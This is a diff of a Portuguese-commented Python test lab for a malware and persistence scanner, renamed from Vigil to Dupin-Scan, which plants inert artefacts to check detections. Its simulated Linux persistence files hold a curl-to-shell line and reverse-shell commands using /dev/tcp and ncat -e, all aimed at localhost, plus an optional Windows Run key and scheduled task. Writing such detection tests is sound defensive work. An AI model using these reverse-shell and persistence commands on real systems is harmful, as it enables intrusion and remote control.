@@ -1,4 +1,4 @@
-"""Laboratório do Vigil: cria artefatos INOFENSIVOS que disparam cada detecção e confere se o scanner
+"""Laboratório do Dupin-Scan: cria artefatos INOFENSIVOS que disparam cada detecção e confere se o scanner
 os encontra (e com a técnica ATT&CK certa).
 
     python lab/run_lab.py               # seguro: só cria arquivos numa pasta temporária
@@ -27,7 +27,7 @@ sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 from datetime import datetime, timedelta  # noqa: E402
 from xml.sax.saxutils import escape  # noqa: E402
 
-from vigil import core, export_rules, forensics  # noqa: E402
+from dupin_scan import core, export_rules, forensics  # noqa: E402
 
 
 class Result(NamedTuple):
@@ -76,16 +76,16 @@ def lab_files(tmp):
     (d / "fatura.pdf").write_bytes(b"MZ" + b"\0" * 300)               # PE disfarçado de documento
     (d / "foto.png.exe").write_text("inofensivo")                      # dupla extensão
     (d / "empacotado.bin").write_bytes(b"MZ" + os.urandom(8192))       # cabeçalho PE + entropia alta
-    sample = b"vigil-lab-amostra-conhecida"
+    sample = b"dupin-scan-lab-amostra-conhecida"
     (d / "conhecido.dat").write_bytes(sample)                          # hash na lista
-    (d / "marcador.txt").write_text("VIGIL-LAB-MARKER")                # regra YARA própria do lab
+    (d / "marcador.txt").write_text("DUPIN-SCAN-LAB-MARKER")                # regra YARA própria do lab
     (d / "nota.txt").write_text("arquivo limpo")                       # não deve gerar achado
     hashes = tmp / "hashes.txt"
     hashes.write_text("# lista do lab\n" + hashlib.sha256(sample).hexdigest() + "\n")
 
     yara_dir = tmp / "yara"
     export_rules.write_all(yara_dir, "yara")  # as regras exportadas também são testadas aqui
-    (yara_dir / "lab_marker.yar").write_text('rule vigil_lab_marker { strings: $a = "VIGIL-LAB-MARKER" condition: $a }')
+    (yara_dir / "lab_marker.yar").write_text('rule dupin_scan_lab_marker { strings: $a = "DUPIN-SCAN-LAB-MARKER" condition: $a }')
 
     rep = core.run_scan(modules=("files",), targets=[str(d)], hashes_path=str(hashes),
                         yara_dir=str(yara_dir) if core.yara else None)
@@ -101,10 +101,10 @@ def lab_files(tmp):
         out += [Result("SKIP", "YARA (regras exportadas e próprias)", "yara-python não instalado")]
     else:
         out += [
-            check("yara exportada: disfarçado", f, "fatura.pdf", "vigil_executavel_disfarcado_de_documento"),
-            check("yara exportada: dupla extensão", f, "foto.png.exe", "vigil_dupla_extensao_suspeita"),
-            check("yara exportada: entropia", f, "empacotado.bin", "vigil_binario_alta_entropia"),
-            check("yara própria do lab", f, "marcador.txt", "vigil_lab_marker"),
+            check("yara exportada: disfarçado", f, "fatura.pdf", "dupin_scan_executavel_disfarcado_de_documento"),
+            check("yara exportada: dupla extensão", f, "foto.png.exe", "dupin_scan_dupla_extensao_suspeita"),
+            check("yara exportada: entropia", f, "empacotado.bin", "dupin_scan_binario_alta_entropia"),
+            check("yara própria do lab", f, "marcador.txt", "dupin_scan_lab_marker"),
         ]
     return out
 
@@ -115,7 +115,7 @@ def lab_persistence_linux_simulada(tmp):
     home = tmp / "home"
     (home / ".config" / "autostart").mkdir(parents=True)
     (home / ".config" / "systemd" / "user").mkdir(parents=True)
-    (home / ".bashrc").write_text("# lab\nexport A=1\n: curl http://127.0.0.1/vigil-lab | sh\n")
+    (home / ".bashrc").write_text("# lab\nexport A=1\n: curl http://127.0.0.1/dupin-scan-lab | sh\n")
     (home / ".config" / "autostart" / "lab.desktop").write_text("[Desktop Entry]\nExec=bash -i >& /dev/tcp/127.0.0.1/9\n")
     (home / ".config" / "systemd" / "user" / "lab.service").write_text("[Service]\nExecStart=/usr/bin/ncat 127.0.0.1 9 -e /bin/sh\n")
     with env(HOME=str(home), USERPROFILE=str(home)):
@@ -133,19 +133,19 @@ def lab_persistence_windows(tmp, registry):
         return [Result("SKIP", "persistência Windows", "só roda em Windows")]
     startup = tmp / "appdata" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
     startup.mkdir(parents=True)
-    (startup / "vigil_lab.bat").write_text("@echo off\nrem vigil lab\n")
+    (startup / "dupin_scan_lab.bat").write_text("@echo off\nrem dupin-scan lab\n")
     out = []
     import winreg
 
     run_sub = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    task = "VigilLab"
+    task = "DupinScanLab"
     created_key = created_task = False
     try:
         if registry:
             with winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_sub) as k:
-                winreg.SetValueEx(k, "VigilLab", 0, winreg.REG_SZ, "cmd.exe /c rem powershell -enc VIGILLAB")
+                winreg.SetValueEx(k, "DupinScanLab", 0, winreg.REG_SZ, "cmd.exe /c rem powershell -enc DUPINSCANLAB")
             created_key = True
-            r = subprocess.run(["schtasks", "/create", "/tn", task, "/tr", r"cmd.exe /c rem C:\Users\Public\vigil_lab",
+            r = subprocess.run(["schtasks", "/create", "/tn", task, "/tr", r"cmd.exe /c rem C:\Users\Public\dupin_scan_lab",
                                 "/sc", "once", "/st", "00:00", "/f"], capture_output=True, text=True,
                                errors="replace", creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
             created_task = r.returncode == 0
@@ -153,9 +153,9 @@ def lab_persistence_windows(tmp, registry):
                 out.append(Result("SKIP", "windows/tarefa agendada", f"schtasks falhou: {(r.stderr or r.stdout).strip()[:120]}"))
         with env(APPDATA=str(tmp / "appdata")):
             f = core.windows_persistence()
-        out.append(check("windows/pasta Startup", f, "vigil_lab.bat", "Startup", ("T1547.001",)))
+        out.append(check("windows/pasta Startup", f, "dupin_scan_lab.bat", "Startup", ("T1547.001",)))
         if registry:
-            out.append(check("windows/chave Run (HKCU)", f, r"Run\VigilLab", "PowerShell codificado",
+            out.append(check("windows/chave Run (HKCU)", f, r"Run\DupinScanLab", "PowerShell codificado",
                              ("T1547.001", "T1059.001", "T1027.010")))
             if created_task:
                 out.append(check("windows/tarefa agendada", f, task, "diretório suspeito", ("T1053.005",)))
@@ -165,7 +165,7 @@ def lab_persistence_windows(tmp, registry):
         if created_key:
             with contextlib.suppress(OSError):
                 with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_sub, 0, winreg.KEY_SET_VALUE) as k:
-                    winreg.DeleteValue(k, "VigilLab")
+                    winreg.DeleteValue(k, "DupinScanLab")
         if created_task:
             subprocess.run(["schtasks", "/delete", "/tn", task, "/f"], capture_output=True,
                            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
@@ -297,7 +297,7 @@ def lab_forensics(tmp):
 
 # ------------------------------------------------------------------ profundidade, estado, confiança, CLI
 def lab_depth(tmp):
-    from vigil import persist, report, state, timeline, trust
+    from dupin_scan import persist, report, state, timeline, trust
     out = []
     host = core.host_os()
 
@@ -378,7 +378,7 @@ def lab_depth(tmp):
             try:
                 n = len(forensics._evtx_events(evtx, notes=notes)) if hasattr(forensics, "_evtx_events") else -1
                 out.append(Result("PASS", ".evtx exportado é lido", f"{n} eventos" if n >= 0 else "lido"))
-            except Exception as e:  # noqa - python-evtx ausente aparece como nota, não como falha do Vigil
+            except Exception as e:  # noqa - python-evtx ausente aparece como nota, não como falha do Dupin-Scan
                 out.append(Result("SKIP" if "evtx" in str(e).lower() else "FAIL", ".evtx exportado é lido", str(e)[:100]))
         else:
             out.append(Result("SKIP", ".evtx exportado é lido", "não foi possível exportar o log System"))
@@ -390,7 +390,7 @@ def lab_depth(tmp):
     alvo.mkdir()
     (alvo / "x.pdf.exe").write_text("x")
     rel = tmp / "cli.json"
-    base = [sys.executable, "-m", "vigil", "scan", "--modules", "files", "--targets", str(alvo), "--no-trust", "--quiet", "--out", str(rel)]
+    base = [sys.executable, "-m", "dupin_scan", "scan", "--modules", "files", "--targets", str(alvo), "--no-trust", "--quiet", "--out", str(rel)]
     proj = str(Path(__file__).resolve().parent.parent)
     c_ok = subprocess.run(base + ["--fail-on", "ALTO"], cwd=proj, capture_output=True).returncode
     c_med = subprocess.run(base + ["--fail-on", "MÉDIO"], cwd=proj, capture_output=True).returncode
@@ -419,7 +419,7 @@ def lab_process():
 
 # ------------------------------------------------------------------ execução
 def run(registry=False, processes=True):
-    with tempfile.TemporaryDirectory(prefix="vigil-lab-", ignore_cleanup_errors=True) as t:
+    with tempfile.TemporaryDirectory(prefix="dupin-scan-lab-", ignore_cleanup_errors=True) as t:
         tmp = Path(t)
         results = lab_files(tmp)
         results += lab_persistence_linux_simulada(tmp)
@@ -432,7 +432,7 @@ def run(registry=False, processes=True):
 
 
 def main(argv=None):
-    ap = argparse.ArgumentParser(description="Laboratório de testes do Vigil (artefatos inofensivos).")
+    ap = argparse.ArgumentParser(description="Laboratório de testes do Dupin-Scan (artefatos inofensivos).")
     ap.add_argument("--registry", action="store_true",
                     help="Windows: cria e remove uma chave Run (HKCU) e uma tarefa agendada inofensivas")
     ap.add_argument("--no-processes", action="store_true", help="não cria o processo de teste")
